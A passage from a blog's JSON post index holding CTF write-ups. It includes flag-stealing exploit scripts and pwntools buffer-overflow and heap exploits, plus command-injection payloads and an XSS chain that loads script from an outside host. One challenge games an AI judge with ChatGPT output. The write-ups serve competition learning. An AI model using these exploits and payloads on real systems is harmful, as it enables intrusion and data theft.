[ { "title": "HITB Phuket 2023", "url": "/posts/HITB_Phuket_2023/", "categories": "Attack-Defence", "tags": "ctf, attack-defence", "date": "2023-08-26 00:00:00 +0000", "snippet": "Pure Challenge WriteupThe official writeup from the organizers is available here. I’m going to let that cover the technical details of the vulnerability as in this writeup I want to focus on the development of the exploit.Initially we got the payload from analysing Tulip logs. We noticed someone with the cookie settings=isAdmin:1 could read any contact on the platform. The contact ids for the flags are given to us by the A/D API.Another notable thing about this challenge is that attackers are able to delete the contact/flag. This means that only the first attacker (and others if they are lucky) will get the points so speed is a necessity for this exploit script to be successful.Here is the first iteration of the exploit:#!/usr/bin/python3import osimport requestsimport reimport stringimport randomimport jsonhost = os.getenv(&quot;TARGET_IP&quot;)flag_ids = json.loads(os.getenv(&quot;TARGET_EXTRA&quot;, &quot;{}&quot;))def gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))for flag_id in flag_ids: s = requests.Session() data = { &quot;username&quot;: gen_rand(), &quot;password&quot;: gen_rand() } try: r = s.post(f&quot;https://{host}/register&quot;, data=data) s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host) r = s.get(f&quot;https://{host}/edit/{flag_id}&quot;) flag = re.findall(r&quot;TEAM\\d{3}_[A-Z0-9]{32}&quot;, r.text)[0] print(flag) except: passWe used ataka during this CTF to manage our exploits. This gives the target and target info to our script as env variables and automates the repeated running of the exploit across the different targets. Ataka ingests the flags and submits them by using a regex on the script output.Here is the second iteration of the exploit:#!/usr/bin/python3import osimport requestsimport reimport stringimport randomimport timehost = os.getenv(&quot;TARGET_IP&quot;)def gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))s = requests.Session()s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host)data = { &quot;username&quot;: gen_rand(), &quot;password&quot;: gen_rand()}r = s.post(f&quot;https://{host}/register&quot;, data=data)#r = s.get(f&quot;https://{host}/&quot;) -- this line is not needed as the register request follows the redirect and returns the same informationids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))while len(ids)==0: time.sleep(3) r = s.get(f&quot;https://{host}/&quot;) ids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))for id in ids: r = s.get(f&quot;https://{host}/edit/{id}&quot;) flags = re.findall(r&quot;TEAM\\d{3}_[A-Z0-9]{32}&quot;, r.text) for flag in flags: print(flag)for id in ids: r = s.get(f&quot;https://{host}/delete/{id}&quot;)The first change we made was to avoid using the flag_ids data. Often it would be outdated when you attempt to use it as the flags will already be deleted. Instead we relied on the index of the app when viewed with the cookie, this showed all contacts from the application.If no contacts are on the app we wait 3 seconds and try again and keep doing so until one does appear. This is good because we avoid losing time rerunning the script and registering a new account.When we have ids from the index we check all of them straight away.Only after we have checked them do we make the delete requests, preventing others from getting the points comes after we’ve secured points ourselves.Third iteration:#!/usr/bin/python3import osimport requestsimport reimport stringimport randomimport timefrom sys import argvhost=argv[1]def gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))s = requests.Session()s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host)data = { &quot;username&quot;: gen_rand(), &quot;password&quot;: gen_rand()}r = s.post(f&quot;https://{host}/register&quot;, data=data)ids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))counter = 0while len(ids)==0: counter+=1 if counter==100: print(f&quot;{host} is patched?&quot;) exit() time.sleep(2) r = s.get(f&quot;https://{host}/&quot;) ids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))all_flags = []for id in ids: r = s.get(f&quot;https://{host}/edit/{id}&quot;) flags = re.findall(r&quot;TEAM\\d{3}_[A-Z0-9]{32}&quot;, r.text) for flag in flags: all_flags.append(flag)for flag in all_flags: print(flag) os.system(f&quot;../atk flag submit {flag}&quot;)for id in ids: r = s.get(f&quot;https://{host}/delete/{id}&quot;)One of the disadvantages of using ataka to run the exploit is that it wont run against all the hosts in parallel, only a subset (idk how many) so instead we avoided using ataka to run this one and instead chose to run it with xargs:echo &quot;python3 pure3.py $1 &amp;gt; out/$1 2&amp;gt;&amp;amp;1&quot; &amp;gt; pure.shchmod +x pure.shmkdir outcat pure_hosts.txt | xargs -n1 -P100 ./pure.shWe also added a counter to the while loop to try and weed out servers that were no longer vulnerable and stop them wasting server resources. Because we no longer used ataka for handling running the exploit we needed to submit flags a different way. I chose to invoke the atk file provided to do that but this is very slow. However overall its not too negative on our exploit - if we get to that point we’ve won a race for flags already.This exploit doesn’t loop as it was intended to just identify what servers were still vulnerable.The next version simply wrapped the exploit in an infinite while loop with a try except to avoid crashing to random http errors.Final exploit:#!/usr/bin/python3import jsonimport loggingimport reimport requestsimport timeimport stringimport randomimport timefrom sys import argvlogger = logging.getLogger()CHECKSYSTEM_TOKEN = &quot;CHECKSYSTEM_000_00000000000000000000000000000000&quot;API_HOST = &quot;https://ctf.hitb.org&quot;flag_regex = re.compile(r&quot;TEAM[0-9]*_[A-Z0-9]{32}&quot;)id_regex = re.compile(r&quot;[a-f0-9]{24}&quot;)seen = set()def submit_flags(flags): flags = list(set(flags).difference(seen)) seen.update(flags) if len(flags)==0: return logger.error(f&quot;SUBMITTING {json.dumps(flags)}&quot;) try: data = requests.put(f&quot;{API_HOST}/flags&quot;,headers={&#39;X-Team-Token&#39;:CHECKSYSTEM_TOKEN},json=flags).json() except: time.sleep(5) submit_flags(flags) return flag_count = len(data) accepted_count = 0 for x in data: if &quot;Accepted&quot; in x[&#39;msg&#39;]: accepted_count+=1 logger.error(f&quot;Accepted flags: {accepted_count}, Denied flags: {flag_count-accepted_count}&quot;) return script,host = argvdef gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))while True: s = requests.Session() s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host) data = {&quot;username&quot;: gen_rand(),&quot;password&quot;: gen_rand()} try: r = s.post(f&quot;https://{host}/register&quot;, data=data) ids = list(set(id_regex.findall(r.text))) counter = 0 while len(ids)==0: counter+=1 if counter==100: print(f&quot;{host} is patched?&quot;) exit() time.sleep(2) r = s.get(f&quot;https://{host}/&quot;) ids = list(set(id_regex.findall(r.text))) all_flags = [] for id in ids: r = s.get(f&quot;https://{host}/edit/{id}&quot;) flags = flag_regex.findall(r.text) for flag in flags: all_flags.append(flag) for id in ids: r = s.get(f&quot;https://{host}/delete/{id}&quot;) submit_flags(all_flags) except Exception as e: print(e)By now we have narrowed down the list of hosts to the ones still vulnerable.For the final version we handle the flag submission in the script instead of the slow os.system() call we were doing earlier. We register a new account in the while loop after we’ve submitted some flags just in case our account gets deleted or cookie firewalled by the defending server. We use precompiled regexes for a minor performance improvement.We also have logging so we can watch the flags roll in!One potential speed difference as well is that we were running this on the empty server provided by the CTF organisers so we would have less network latency than teams running an exploit on a remote server over the VPN.We were late to get an exploit running on this service but by the end we had collected the most flags from this service with it so all the speed improvements had a big impact.PatchThe exploit relies on knowing the name for value in the cookie (isAdmin) so we just changed every instance of isAdmin to superSecretAdmin and that was enough to not get hacked for the rest of the competition.A better patch would be checking if req.headers[&#39;verified&#39;] == &#39;SUCCESS&#39; every time isAdmin is checked.Cool GraphsHITB were nice enough to send a JSON file with the scoreboard data so I could make some graphs of the flags being stolen on the pure service.In these graphs you can see the point at which the exploit was actually getting us flags, some point near the end the exploit must have stopped working (I didnt know this until I made the graph!). It’s also interesting that other teams were still getting some flags, this could be attributed to some patches maybe breaking my exploit that didnt affect others or maybe my method of weeding out patched instances was a bit inaccurate (ignoring ones where I dont get flags in 5mins). This could have been improved with a better check by adding our own contact and seeing if we could access it with another account. Maybe some teams changed the index we relied on and we couldn’t extract ids. Sometimes our exploit might be unlucky with timings or teams get the flag between us grabbing them and deleting them so we share the flag.ConclusionThanks to the HITB Phuket team for running this A/D CTF, it was a lot of fun and we learned a lot." }, { "title": "Lexington Informatics Tournament CTF 2023", "url": "/posts/Lexington_Informatics_Tournament_CTF_23/", "categories": "Jeopardy", "tags": "ctf, attack-defence", "date": "2023-08-08 00:00:00 +0000", "snippet": "PwnMy Pet Canary’s Birthday PieHere is my first c program! I’ve heard about lots of security features in c, whatever they do. The point is, c looks like a very secure language to me! Try breaking it.For this challenge we are given the source code along with the compiled binary. Lets first look at the source code:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int win() { system(&quot;/bin/sh&quot;);}int vuln() { char buf[32]; gets(buf); printf(buf); fflush(stdout); gets(buf);}int main() { setbuf(stdout, 0x0); setbuf(stderr, 0x0); vuln();}Okay so only 3 functions, win, vuln and main.win just runs system(&quot;/bin/sh&quot;); for us. this will be our target.vuln has two vulnerabilities, a format strings vulnerability in printf and a buffer overflow in gets.The format strings will allow us to leak useful addresses within the binary as pie is enabled. we can also use this to leak the canary token, which is another security this binary has.Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledThe idea for this exploit will be:use the format strings to leak an address in the binary, this will help us the address of win and we also want to leak the canary token. To help with this I use a simple fuzz script:#!/usr/bin/env python3from pwn import *elf = context.binary = ELF(&#39;./s&#39;, checksec=False)for i in range(100): io = process(elf.path,level=&#39;error&#39;) payload = f&quot;%{i}$p&quot; io.sendline(payload) print(f&quot;offset {i} {io.recv()}&quot;)This will print out the leak and the offset of that leak. We know the leak for the elf file will start with 0x55 or 0x56 this can vary slightly but its a good ballpark. The canary token should always end in 00.These are some leaks we get:offset 1 b&#39;0x1&#39;offset 2 b&#39;0x1&#39;offset 3 b&#39;0x7f6cfa619aa0&#39;offset 4 b&#39;(nil)&#39;offset 5 b&#39;(nil)&#39;offset 6 b&#39;0x7f0070243625&#39;offset 7 b&#39;0x7fed790815ff&#39;offset 8 b&#39;(nil)&#39;offset 9 b&#39;(nil)&#39;offset 10 b&#39;0x7ffecfe285c0&#39;offset 11 b&#39;0xe9f733d70ed31600&#39;offset 12 b&#39;0x7ffcbea30270&#39;offset 13 b&#39;0x560354ce82ae&#39;offset 14 b&#39;0x1&#39;offset 15 b&#39;0x7f088c429d90&#39;11 looks like the canary token, and 13 looks like a stack address. we can confirm this by using gbd the steps for that are:run the program with gdb ./s enter %11$p %13%p to get the leaks and use ctrl+c to break the program. x/s 0x5.... for the elf leak and just type canary for the canary token. we can see the canary token matches up and the other leak shows &amp;lt;main+58&amp;gt; so we are leaking main+58. we can run the program a few time to match sure this is always the same. Once we know that we can workout the offset at which main+58 is. and we minus that from our leak and it will give us the base address of the program.Building the exploitThe last part we need is the offset. Due to the canary just throwing a cyclic pattern will know fill rbp with data so we can work it out manually.The buffer is 32 and we will need to padding to reach rbp so it should be 32+8setting out offset as 40 we just need to build the exploit.our first payload will just be the two format string offsets. after we get those leaks we need to get the base address of the program. (we could also just work out the offset from our leak to win)and the 2nd payload will bepadding * 40 + canary token + junk data to reach rbp + ret + winwe need to ret address otherwise our stack alignment will be off.we get this with ropper --file s --search &quot;ret&quot;our final exploit script looks like this:#!/usr/bin/env python3from pwn import *exe = &#39;./s&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())#### Exploit starts here ####io = start()#canary token is 11offset = 40io.sendline(b&#39;%11$p %13$p&#39;)leaks = io.recv().decode()leaks = leaks.split()canary = leaks[0]binleak = leaks[1]binleak = int(binleak,16)base = binleak - 0x12aecanary = int(canary,16)win = base + 0x11e9ret = base + 0x101amain = base + 0x1274log.info(f&quot;canary token {hex(canary)}&quot;)payload = b&#39;A&#39; * offsetpayload += p64(canary)payload += b&#39;\\x00&#39; * 8payload += p64(ret)payload += p64(win)io.sendline(payload)io.interactive()flag: LITCTF{rule_1_of_pwn:_use_checksec_I_think_06d2ee2b}File Reader?This program reads a file called flag.txt, but it doesn’t seem to work…We are given the source code, the binary and the glibc files.Lets look at the source code:#include &amp;lt;fcntl.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int main() { char *c = malloc(64); char *d = malloc(64); printf(&quot;%p\\n&quot;, d); unsigned long a = 0; unsigned long b = 0; free(c); scanf(&quot;%lu&quot;, &amp;amp;a); scanf(&quot;%lu&quot;, &amp;amp;b); *((unsigned long *)a) = b; puts(&quot;Exiting...&quot;); free(c); int fd = open(&quot;flag.txt&quot;, O_RDONLY); d[read(fd, d, 64)-1] = 0; puts(d); free(d); return 0;}We can see the use of malloc and free so this will be a heap related exploit.running the program leaks an address.printf(&quot;%p\\n&quot;, d);This is leaking the address of d, which means we have a heap address beaning leaked. c is than free’d.The next 3 lines of code is what we are exploiting:scanf(&quot;%lu&quot;, &amp;amp;a);scanf(&quot;%lu&quot;, &amp;amp;b);*((unsigned long *)a) = b;The scanf will let us write to a and b. and *((unsigned long *)a) = b; is than writing the content of b to a.next the program frees c again, but this is a double free which makes the program crash. it crashes just before the flag is printed as well which is a shame :(we can see that in action by just writing any data to the leaked address.(we first convert the hex address to int)❯ ./s0x55e85c2762f094456466858736123Exiting...free(): double free detected in tcache 2So the idea for this will be to stop the double free.We know the malloc chunk is 64 bytes so we if take say, 65 away from the leaked address, and write junk data to that location. we can overwrite the key value of that chunk, this way the program does not know if this chunk has been free’d and the program will not crash, and it will reach the part that prints the flag.the exploit script:#!/usr/bin/env python3from pwn import *exe = &#39;./s&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())#### Exploit starts here ####io = start()heapaddr = io.recvline().strip()heapaddr = int(heapaddr, 16)io.sendline(str(heapaddr - 65).encode())io.sendline(str(heapaddr).encode())log.success(io.recvlines(2)[1].decode())This pdf gives a better outline of what is happening in this exploit: https://drive.google.com/file/d/1g2qIENh2JBWmYgmfTJMJUier8w0XAGDt/viewflag: LITCTF{very_legitimate_exit_function}MiscSo You Think You Can TalkA lot of people think they can….. Well let’s find out in our Discord Server #so-you-think-you-can-talk channel. Beat your competitors by talking most! Send +explain in the channel to get a more detailed explanation of the challenge.This is a misc discord challenge.going to that channel we can get more info:The bots code:client.on(&quot;messageCreate&quot;, async (msg) =&amp;gt; { if(msg.content.length &amp;gt; 2000) return; if(msg.channelId == 1137653157825089536) { // Within the right channel user_id = msg.author.id; if(!users.has(user_id)) { users.set(user_id,new User(msg.author.globalName)); } if(users.get(user_id).disabled) return; if(msg.mentions.repliedUser) { const repliedTo = await msg.channel.messages.fetch(msg.reference.messageId); if(repliedTo.content.length &amp;gt; 2000) return; if(repliedTo.author.id == msg.author.id) return; if(msg.createdTimestamp - repliedTo.createdTimestamp &amp;lt;= 2 * 60000) { // 2 minutes of time if(await check(msg.content,repliedTo.content)) { // Yay successfully earn point users.get(user_id).score += 1; users.get(repliedTo.author.id).score = Math.max(users.get(repliedTo.author.id).point - 0.4,0); msg.react(&#39;😄&#39;); }else{ // Nope, you get points off users.get(user_id).score = Math.max(users.get(user_id).score - 0.4,0); msg.react(&#39;😭&#39;); } } }else{ // [redacted] } }});and +explain tells us:The objective of this game is to talk as much as possible. However, your messages can&#39;t just be SPAM, as they will be verified by chatGPT. In order to earn a point, the following criteria must be met: You must send the message in this channel You must be replying to a message sent by another author The message you reply to must be recent and no more than 2 minutes old Your comment must be respectful, substanceful, and insightful. ChatGPT gets to decide if you pass this or not. Finally, after some set period of time (like 15 minutes), whoever is the highest on the leaderboard will get the flag IF they also have at least 20 points.If you pass all criterion, you get 1 point. If you pass all but the last criterion, you get deducted 0.4 point. In addition, if somebody replies to you and passes, you get deducted 0.4 points.Finally, for more details, try the +code command to see the relevant source code.Okay, we we need to respond to others in the channel, our messages will be checked by chatgpt to see if they are “respectful, substanceful, and insightful” and if chatgpt likes the message we get a smiley face, otherwise we get a crying face. Only messages that are responding to other uses will work for this.I went to chatgpt and gave it this prompt:Userlet play a game. I will ask you some random things and they you must be respectful, substanceful, and insightful to me when i ask. do you understand?and gotOf course, I understand. I&#39;m here to provide respectful, substanceful, and insightful responses to your questions. Feel free to ask anything, and I&#39;ll do my best to assist you! Let&#39;s start the game.What happened next is a long story.in steps Jim.I dont know Jim but for around 30-40 minutes Jim would ask random questions which I just threw into chatgptStarted with:I&#39;ve been thinking about buying a flat keyboard, but I also want coffee. How can I get both?My first happy face. I need 20 of these to get the flag.The tale look a turn and went from a question of keyboards to Jefferey, who went from getting bullied, to being a bully to stacking what we can assume is Jim. all this time chatgpt was giving “respectful, substanceful, and insightful” replies to the life of Jefferey and Jim. This entire story will soon be a movie, We are just waiting on Netflix to get back to us.After close to 40 minutes I got the flag. Only the person in first gets the flag so I was beaten to the spot once, and didnt have 20 points the first time it came around.flag: LITCTF{Huh_1_gu3s5_u_R34lly_c4n_t4lk_4ft3ral1}geoguessrWhere am I? The flag is LITCTF{latitude,longtitude} rounded to the third decimal place. (Example: LITCTF{42.444,-71.230})All I had to go off for this challenge was this image: Going off the challenge name and description, I figured that I needed to find the location that the image was taken. Checking the metadata of the image yielded no results, so to google maps we go!First, I had a good look at the image. I noticed that the cars were driving on the right hand side of the road, and there was a speed limit sign that said 55. I immediately thought of America. Further searching of the image, I saw the blue signs on the right of the image, which confirmed to me that it was the USA.Zooming in on the image, I could just about make out that the top sign said 87, and the bottom sign was 28- (I wasn’t sure whether the last number was a 1 or a 7).I went down a rabbit hole for a little while, looking at different route 87’s in the USA, and eventually found out that the blue signs meant it was an interstate.I put I-87 into google maps (other online maps are available :D) where it put me in New York, and made my way up the map until I noticed that it merged into the I-287 for a stretch. At this point, I went into street view and had the picture up as reference. Looking at the background of the picture, I could faintly make out water lines, so I went over the Mario Cuomo bridge and went to the bend on the left (near South Nyack) until I matched what I saw on Google Maps with the original image.Using the description as a hint for the flag format, I rounded the last numbers to get the flag.flag: LITCTF{41.077,-73.921}ReviloveregexFor this challenge we are just given the flag regex:^LITCTF\\{(?&amp;lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\\1)(?=.{4}(.).{18}\\2)(?=.{6}(.).{2}\\3)(?=.{3}(.).{11}\\4)(?=.{3}(.).{3}\\5)(?=.{16}(.).{4}\\6)(?=.{27}(.).{4}\\7)(?=.{12}(.).{4}\\8)(?=.{3}(.).{8}\\9)(?=.{18}(.).{2}\\10)(?=.{4}(.).{20}\\11)(?=.{11}(.).{2}\\12)(?=.{32}(.).{0}\\13)(?=.{3}(.).{24}\\14)(?=.{12}(.).{9}\\15)(?=.{7}(.).{2}\\16)(?=.{0}(.).{12}\\17)(?=.{13}(.).{5}\\18)(?=.{1}(.).{0}\\19)(?=.{27}(.).{3}\\20)(?=.{8}(.).{17}\\21)(?=.{16}(.).{6}\\22)(?=.{6}(.).{6}\\23)(?=.{0}(.).{1}\\24)(?=.{8}(.).{11}\\25)(?=.{5}(.).{16}\\26)(?=.{29}(.).{1}\\27)(?=.{4}(.).{9}\\28)(?=.{5}(.).{24}\\29)(?=.{15}(.).{10}\\30).*}$To approach this I broke it down into parts and manually made matching strings on RegExr.First is the start and end which are literals - LITCTF{}.Next I need to match this regex: ^LITCTF\\{(?&amp;lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5}).*}$(?&amp;lt;=...) is a positive lookbehind, I’m not going to pretend to understand how that works but the whole string must match it in this case.(?=...) is a positive lookahead which needs to match everything after the current point in the string (because we’re in the lookbehind this means from the start) but it’s a lookahead meaning the next token in the regex starts at the same point.So (?=.{42}(?!.)) means there is 42 characters after this point and no more..(?=.{24}greg) means 25 characters into the string the next characters are greg.(?=.{30}gex) means 32 characters (incl. the dot from previous part) into the string the next characters are gex.Putting that all together we get our first matching string:LITCTF{__________________greg___gex______}All the next regex components use lookaheads with backreferences.Backreferences match previously matched parts of the string. So for example \\1 will match the first group that was matched.Let’s try: ^LITCTF\\{(?&amp;lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\\1).*}Weird, our existing string already matches? Yes since most of the characters are underscores the backreferences will match anyway.We can’t continue like this however as we will need to figure out what backrfeferences matches what later.(?=.{4}(.).{19}\\1) means the 20th character matches the 5th character, so let’s replace those with 1 for now:LITCTF{____1_____________greg__1gex______}The rest is left as an exercise for the reader.Flag: LITCTF{rrregereeregergegegregegggexexexxx}WebPing pongThe code for this challenge is:from flask import Flask, render_template, redirect, requestimport osapp = Flask(__name__)@app.route(&#39;/&#39;, methods = [&#39;GET&#39;,&#39;POST&#39;])def index(): output = None if request.method == &#39;POST&#39;: hostname = request.form[&#39;hostname&#39;] cmd = &quot;ping -c 3 &quot; + hostname output = os.popen(cmd).read() return render_template(&#39;index.html&#39;, output=output)The solution is fairly straight forward, we have command execution as our input is added to a command without any sanitization.Payload:fbi.gov;cat flag.txtFlag: LITCTF{I_sh0uld_b3_m0r3_c4r3ful}Ping Pong: Under MaintenanceThe next iteration of this is a bit more challengingfrom flask import Flask, render_template, redirect, requestimport osapp = Flask(__name__)@app.route(&#39;/&#39;, methods = [&#39;GET&#39;,&#39;POST&#39;])def index(): output = None if request.method == &#39;POST&#39;: hostname = request.form[&#39;hostname&#39;] cmd = &quot;ping -c 3 &quot; + hostname output = os.popen(cmd).read() return render_template(&#39;index.html&#39;, output=&#39;The service is currently under maintainence and we have disabled outbound connections as a result.&#39;)This time we don’t get any output and the server doesn’t allow outbound connections (we tested with interactsh and curl, wget and ping to be sure!).However we do have a way to extract information.;sleep 3 will delay the response by 3 seconds. So if we bruteforce the flag character by character and make it sleep when it matches we will have the flag.Here’s the script I made for this:import requestsimport stringtarget = &#39;http://34.130.180.82:55943/&#39;pos = 0flag = &#39;&#39;while True: for x in string.printable: payload = &#39;;bash -c \\&#39;flag=`cat flag.txt`;if [ ${flag:&#39; + str(pos) + &#39;:1} == &quot;&#39;+x+&#39;&quot; ]; then sleep 10; fi\\&#39;&#39; r = requests.post(target,data={&#39;hostname&#39;:payload}) if r.elapsed.total_seconds() &amp;gt; 10: print(f&quot;Char: {x}&quot;) flag+=x if x==&#39;}&#39;: exit(flag) break print(f&quot;{pos} - {x} - {r.elapsed.total_seconds()}&quot;) pos+=1Thankfully the flag wasn’t too long: LITCTF{c4refu1_fr}Art-ContestThis challenge had a lot of steps and in the end was only solved by 7 teams.The GoalWhen doing web challenges, I’ll usually work backwards by first figuring out where the flag is stored and then seeing what functionality can be used to reach that target. In this case, if the /judge endpoint is called with a valid ID and the bot subsequently opens the status page for the ID and it contains “winner!!” in its text, it will replace the content of the status file with the flag. We can then visit the status page and retrieve the flag. It seems as though we will need to confuse the judge bot into thinking our page contains the aforementioned text.XSS via file upload bypassIt is possible to upload any file which has either an extension of “txt” or no extension at all. To check the extension, the following code is used:ext = os.path.splitext(abs_path)[1]This is not a secure means of validating a file extension and we can get XSS by uploading a file with a name such as ...html to the /upload endpoint.We tried a number of directory traversal tricks here but didn’t find anything of use aside from the XSS.This XSS is useful because the judge bot will visit this file before checking the page status. We can use this to manipulate the bot so that its next request to check the status will contain winner!!. But how?Polluting context.pagesWe can see the following code defines status_page:status_page = context.pages[1]In order to get the flag, we must see winner!! in the status_page.content() method call. We noticed that using the previous XSS to call window.open() does just that. It will add an additional page to the context.pages list and it happens to be located at context.pages[1]in the list!A little known fact is that you can actually modify the content of a window.open() using code such as:var my = window.open(&#39;/x&#39; + e, &#39;_blank&#39; ,&quot;height=600, width=600&quot;);my.onload = function () { my.document.body.innerHTML = &quot;winner!!&quot;;};This would be pass the check for content containing winner!! but we must also allow for the status_page.url == &quot;http://localhost:5000/status/&quot; + id check.Herein lies a small issue; we don’t know the value for the id variable!This isn’t actually such a big problem, we can just upload a separate file and save its ID. Then we have a valid ID to reference. I decided to host this on my server and use a fetch() to pull its value so I could easily change the ID if I needed:fetch(&quot;http://ireland.re/callback&quot;).then(r =&amp;gt; {console.log(r.text().then(e =&amp;gt; {var my = window.open(&#39;http://127.0.0.1:5000/status/&#39; + e, &#39;_blank&#39; ,&quot;height=600, width=600&quot;);my.onload = function () { my.document.body.innerHTML = &quot;winner!!&quot;;};But we encounter another problem here. You can only edit the content of a window if it’s within the same origin in which the javascript is executing. Our payload is running on the file:// URI, which does not have authority over a localhost page.XSS via filenameThen I noticed that there is actually a second XSS, in the filename of the upload. We can pass the above script in here (where it will be able to modify the window.open).But it won’t ever visit this page, right?Yes, it won’t. But we can now just redirect from the file:// page to this.Final ApproachWe upload a file with the name &amp;lt;script src=&#39;http://ireland.re/js&#39;&amp;gt;&amp;lt;/script&amp;gt; which has the following contents:fetch(&quot;http://ireland.re/callback&quot;).then(r =&amp;gt; {console.log(r.text().then(e =&amp;gt; {var my = window.open(&#39;http://127.0.0.1:5000/status/&#39; + e, &#39;_blank&#39; ,&quot;height=600, width=600&quot;);my.onload = function () { my.document.body.innerHTML = &quot;winner!!&quot;;};We save the ID of the uploaded file.Then, we upload a file with the following contents:We first upload a file names ...html with the following contents:&amp;lt;script&amp;gt;window.location.href = &quot;http://127.0.0.1:5000/status/&amp;lt;id&amp;gt;&quot;;&amp;lt;/script&amp;gt;We can substitute the ID in above, for &amp;lt;id&amp;gt; and it will redirect to the page containing our payload.We will need to first submit the original file for judging, so its status page is populated with our XSS payload. Then, we can submit the previously uploaded file for judging.It will visit our file:// XSS which will redirect it to our status page containing another XSS, use window.open() to pollute the page context and modify it to contain winner!! with the correct origin. Then, we simply visit the status page to retrieve the flag!CreditsThanks to all members of Ireland Without the RE who helped with this. It was a fun challenge!-m0z" }, { "title": "TheFewChosen 2023", "url": "/posts/TheFewChosen_2023/", "categories": "Jeopardy", "tags": "ctf, crypto, web, pwn, reversing, forensics", "date": "2023-07-30 00:00:00 +0000", "snippet": "CryptoDizzyWe’re given this to decipher:T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24The solution is to rearrange the characters in order and the order is determined by the number attached after it.f = &quot;T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24&quot;.split()f[&#39;T4&#39;, &#39;l16&#39;, &#39;_36&#39;, &#39;510&#39;, &#39;_27&#39;, &#39;s26&#39;, &#39;_11&#39;, &#39;320&#39;, &#39;414&#39;, &#39;{6&#39;, &#39;}39&#39;, &#39;C2&#39;, &#39;T0&#39;, &#39;m28&#39;, &#39;317&#39;, &#39;y35&#39;, &#39;d31&#39;, &#39;F1&#39;, &#39;m22&#39;, &#39;g19&#39;, &#39;d38&#39;, &#39;z34&#39;, &#39;423&#39;, &#39;l15&#39;, &#39;329&#39;, &#39;c12&#39;, &#39;;37&#39;, &#39;19&#39;, &#39;h13&#39;, &#39;_30&#39;, &#39;F5&#39;, &#39;t7&#39;, &#39;C3&#39;, &#39;325&#39;, &#39;z33&#39;, &#39;_21&#39;, &#39;h8&#39;, &#39;n18&#39;, &#39;132&#39;, &#39;k24&#39;]d = {}for x in f: d[x[1:]] = x[0]flag = &quot;&quot;for i in range(len(d.keys())): flag += d[str(i)]print(flag)Running the script gives the flag:TFCCTF{th15_ch4ll3ng3_m4k3s_m3_d1zzy_;d}MayDay!We’re given this to decipher:Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform SevenPutting this into cryptii yields:wh4tDashAlphar3DashyouDashs1nkingDash4b0u7The flag is:TFCTF{WH4T-AR3-YOU-S1NKING-4B0U7}ForensicsSome TrafficWe’re given a pcapng file to analyse. From reading the requests we can see a few HTTP POST requests containing image files.We can convert the pcapng to a pcap file by opening it in Wireshark and saving it. Now we can use Network Miner to extract the image files that are being uploaded in it.The flag can be extracted by running zsteg on the third image (output_modified.png) or by uploading it to AperiSolve. In this case however AperiSolve was inconsistent in showing the full ztego output with the flag.Flag:TFCCTF{H1dd3n_d4t4_1n_p1x3ls_i5n&#39;t_f4n_4nd_e4sy_to_f1nd!}MiscDiscord Shenanigans V3The discord bot has an avatar with the flag in it, you can get it by using inspect element and downloading the discord avatar.My First CalculatorThis challenge is a pyjail where we can’t use letters or full stop.import sysprint(&quot;This is a calculator&quot;)inp = input(&quot;Formula: &quot;)sys.stdin.close()blacklist = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.&quot;if any(x in inp for x in blacklist): print(&quot;Nice try&quot;) exit()fns = { &quot;pow&quot;: pow}print(eval(inp, fns, fns))This restriction can be bypassed by using italic characters that get normalised by python.You can use lingojam’s italic text generator to do this. We used exec with the rest encoded in octal to get the flag.Before 